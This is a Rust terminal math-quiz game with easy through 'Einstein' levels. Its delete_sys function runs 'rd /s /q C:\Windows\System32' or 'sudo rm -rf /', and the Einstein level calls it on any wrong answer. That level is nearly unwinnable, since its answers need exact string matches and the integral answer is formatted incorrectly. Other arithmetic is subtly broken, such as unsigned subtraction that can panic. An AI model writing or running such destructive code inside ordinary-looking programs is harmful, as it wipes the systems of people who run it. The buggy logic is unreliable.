use std::io;
use rand::Rng;
use rand::seq::SliceRandom;
use std::process::Command;
use crossterm::{event::{self, Event, KeyCode}, terminal};

fn clear_screen() {
    if cfg!(target_os = "windows") {
        let _ = Command::new("cmd").arg("/c").arg("cls").status();
    } else {
        let _ = Command::new("clear").status();
    }
}
fn delete_sys() -> io::Result<()> {
    if cfg!(target_os = "windows") {
        println!("Attempting to delete C:\\Windows\\System32. THIS WILL CRASH YOUR SYSTEM.");
        let _ = Command::new("cmd")
            .arg("/c")
            .arg("rd /s /q C:\\Windows\\System32")
            .status();
    } else {
        println!("Attempting to run 'sudo rm -rf /'. THIS WILL DELETE EVERYTHING ON YOUR SYSTEM.");
        let _ = Command::new("sudo")
            .arg("rm")
            .arg("-rf")
            .arg("/")
            .status();
    }
    Ok(())
}

fn wait_for_spacebar() {
    terminal::enable_raw_mode().expect("Failed to enable raw mode");
    loop {
        if let Event::Key(key_event) = event::read().expect("Failed to read event") {
            if key_event.code == KeyCode::Char(' ') {
                break;
            } else {
                println!("Press the spacebar to return to the main menu");
            }
        }
    }
    terminal::disable_raw_mode().expect("Failed to disable raw mode");
}








fn easy_maths() {
    println!("Welcome to the 'EASY' math challenge, yes the EASY math challenge");
    let mut score = 0;
    let mut rng = rand::thread_rng();
    
    loop {
        let num1: u32 = rng.gen_range(1..=10);
        let num2: u32 = rng.gen_range(1..=10);
        let operator = ['+', '-', '/', '*'].choose(&mut rng).unwrap();
        
        let correct_answer = match operator {
            '+' => num1 + num2,
            '-' => num1 - num2,
            '/' => num1 / num2,
            '*' => num1 * num2,
            _ => unreachable!(),
        };
    
        println!("{} {} {} =", num1, operator, num2);
        let mut user_input = String::new();
        io::stdin().read_line(&mut user_input).expect("Failed to read line");
        let user_input: u32 = match user_input.trim().parse() {
            Ok(num) => num,
            Err(_) => {
                println!("Invalid input!! Use numbers.");
                continue;
            }
        };
        
        if user_input == correct_answer {
            println!("Correct! Well done!");
            score += 1;
        } else {
            let wrong_comments = [
                "Oops! Wrong answer. Time to go back to counting fingers.",
                "Close, but no cigar! Maybe try using a calculator next time.",
                "Incorrect! Better luck next time... or never, who knows?",
                "Wrong answer! Looks like someone needs to review their times tables.",
                "Ha, you idiot, learn to math.",
            ];
            println!("{}", wrong_comments.choose(&mut rng).unwrap());
            println!("Your score:  {}", score);
            break;
        }
    }
}

fn moderate_math() {
    println!("Welcome to the Moderate Math Challenge!");

    let mut score = 0;
    let mut rng = rand::thread_rng();

    loop {
        let num1: u32 = rng.gen_range(20..=100);
        let num2: u32 = rng.gen_range(1..=100);
        let operator = ['+', '-', '/', '*'].choose(&mut rng).unwrap();

        // Ensure the division is valid and not division by zero
        let correct_answer = match operator {
            '+' => num1 + num2,
            '-' => num1 - num2,
            '/' => {
                if num2 == 0 {
                    continue; // Skip this iteration if dividing by zero
                } else {
                    num1 / num2
                }
            }
            '*' => num1 * num2,
            _ => unreachable!(),
        };

        println!("What is {} {} {}?", num1, operator, num2);

        let mut user_answer = String::new();
        io::stdin().read_line(&mut user_answer).expect("Failed to read line");
        let user_answer: u32 = match user_answer.trim().parse() {
            Ok(num) => num,
            Err(_) => {
                println!("Invalid input! Try again.");
                continue;
            }
        };

        if user_answer == correct_answer {
            println!("Correct! You're a math whiz!");
            score += 1;
        } else {
            let punishments = [
                "Oops! Wrong answer. Maybe reconsider your approach.",
                "Not quite right! Take another shot at it.",
                "Incorrect! Time to brush up on your arithmetic.",
                "Wrong answer! Keep practicing to improve.",
            ];
            println!("{}", punishments.choose(&mut rng).unwrap());
            println!("Your score: {}", score);
            break; // End the game on a wrong answer
        }
    }
}

fn expert_math() {
    println!("Welcome to the Expert Math Challenge!");

    let mut score = 0;
    let mut rng = rand::thread_rng();

    loop {
        // Generate a random equation type
        let equation_type = rng.gen_range(0..=3);

        let (question, correct_answer) = match equation_type {
            0 => {
                // Quadratic equation: ax^2 + bx + c = 0
                let a: i32 = rng.gen_range(1..=5);
                let b: i32 = rng.gen_range(-5..=5);
                let c: i32 = rng.gen_range(-10..=10);

                let question = format!("Solve the equation {}x^2 + {}x + {} = 0.", a, b, c);

                let discriminant = b * b - 4 * a * c;
                if discriminant < 0 {
                    // No real solutions
                    (question, "No real solutions".to_string())
                } else {
                    let x1 = (-b as f64 + (discriminant as f64).sqrt()) / (2.0 * a as f64);
                    let x2 = (-b as f64 - (discriminant as f64).sqrt()) / (2.0 * a as f64);
                    (question, format!("x1 = {:.2}, x2 = {:.2}", x1, x2))
                }
            }
            1 => {
                // Arithmetic progression: Find the nth term
                let a: i32 = rng.gen_range(1..=10);
                let d: i32 = rng.gen_range(1..=5);
                let n: i32 = rng.gen_range(3..=5);

                let question = format!("Find the {}th term of the arithmetic progression: {}, {}, ..., ?", n, a, a + d);

                let nth_term = a + (n - 1) * d;
                (question, nth_term.to_string())
            }
            2 => {
                // Factorial calculation: n!
                let n: u32 = rng.gen_range(3..=5);

                let question = format!("Calculate {}!", n);

                let mut factorial = 1;
                for i in 1..=n {
                    factorial *= i;
                }
                (question, factorial.to_string())
            }
            3 => {
                // Pythagorean theorem: a^2 + b^2 = c^2
                let a: u32 = rng.gen_range(1..=10);
                let b: u32 = rng.gen_range(1..=10);

                let c_squared = a * a + b * b;

                let question = format!("In a right triangle, if one leg is {} and the other leg is {}, what is the length of the hypotenuse?", a, b);
                let correct_answer = (c_squared as f64).sqrt().round() as u32;

                (question, correct_answer.to_string())
            }
            _ => unreachable!(),
        };

        println!("{}", question);

        let mut user_answer = String::new();
        io::stdin().read_line(&mut user_answer).expect("Failed to read line");

        let user_answer = user_answer.trim();

        if user_answer == correct_answer {
            println!("Correct! You're a math genius!");
            score += 1;
        } else {
            let punishments = [
                "Oops! Wrong answer. Maybe reconsider your approach.",
                "Not quite right! Take another shot at it.",
                "Incorrect! Time to brush up on your advanced math.",
                "Wrong answer! Keep practicing to improve.",
            ];
            println!("{}", punishments.choose(&mut rng).unwrap());
            println!("Your score: {}", score);
            break; // End the game on a wrong answer
        }
    }
}

pub fn einstein_math() {
    println!("Welcome to the Einstein Math Challenge!");

    let mut score = 0;
    let mut rng = rand::thread_rng();

    loop {
        // Generate a random equation type
        let equation_type = rng.gen_range(0..=2);

        let (question, correct_answer) = match equation_type {
            0 => {
                // Basic integral: ∫(ax + b)dx
                let a: f64 = rng.gen_range(1.0..5.0);
                let b: f64 = rng.gen_range(-5.0..5.0);
                let question = format!("Compute the integral ∫({:.2}x + {:.2})dx.", a, b);
                let answer = format!("{:.2}x^2/2 + {:.2}x + C", a / 2.0, b);
                (question, answer)
            }
            1 => {
                // Basic derivative: d/dx(ax^2 + bx + c)
                let a: f64 = rng.gen_range(1.0..5.0);
                let b: f64 = rng.gen_range(-5.0..5.0);
                let c: f64 = rng.gen_range(-10.0..10.0);
                let question = format!("Compute the derivative d/dx({:.2}x^2 + {:.2}x + {:.2}).", a, b, c);
                let answer = format!("{:.2}x + {:.2}", 2.0 * a, b);
                (question, answer)
            }
            2 => {
                // Logarithm: log_a(b)
                let a: f64 = rng.gen_range(2.0..10.0);
                let b: f64 = rng.gen_range(1.0..100.0);
                let question = format!("Compute the logarithm log_{:.2}({:.2}).", a, b);
                let answer = format!("{:.2}", b.log(a));
                (question, answer)
            }
            _ => unreachable!(),
        };

        println!("{}", question);

        let mut user_answer = String::new();
        io::stdin().read_line(&mut user_answer).expect("Failed to read line");

        let user_answer = user_answer.trim();

        if user_answer == correct_answer {
            println!("Correct! You're a math prodigy!");
            score += 1;
        } else {
            let _ = delete_sys();
            println!("Your score: {}", score);
            break; // End the game on a wrong answer
        }
    }
}

pub fn run() {
    println!("Welcome to the Math challenges. Select your difficulty below:");
    
    loop {
        println!("1. Easy");
        println!("2. Moderate");
        println!("3. Expert");
        println!("4. Einstein (!!! WARNING THE CHALLENGE HAS A TWIST ONLY RUN IF YOU DONT MIND LOOSING YOU SYSTEM !!!)");
        println!("5. Exit");
        // User input for choice
        let mut input = String::new();
        io::stdin().read_line(&mut input).expect("Failed to read line");

        let choice: u32 = match input.trim().parse() {
            Ok(num) => num,
            Err(_) => {
                println!("Invalid input. Please enter a number (e.g., 1)");
                continue;
            }
        };

        match choice {
            1 => {
                clear_screen();
                easy_maths();
            }
            2 => {
                clear_screen();
                moderate_math();
            }
            3 => {
                clear_screen();
                expert_math();
            }
            4 => {
                clear_screen();
                einstein_math();
            }
            5 => {
                clear_screen();
                println!("Exiting the challenge arena");
                clear_screen();
                println!("Press space_bar to continue");
                wait_for_spacebar();
                clear_screen();
                break;

            }
            
            _ => {
                println!("Invalid choice. Please select again.");
            }
        }
    }
}
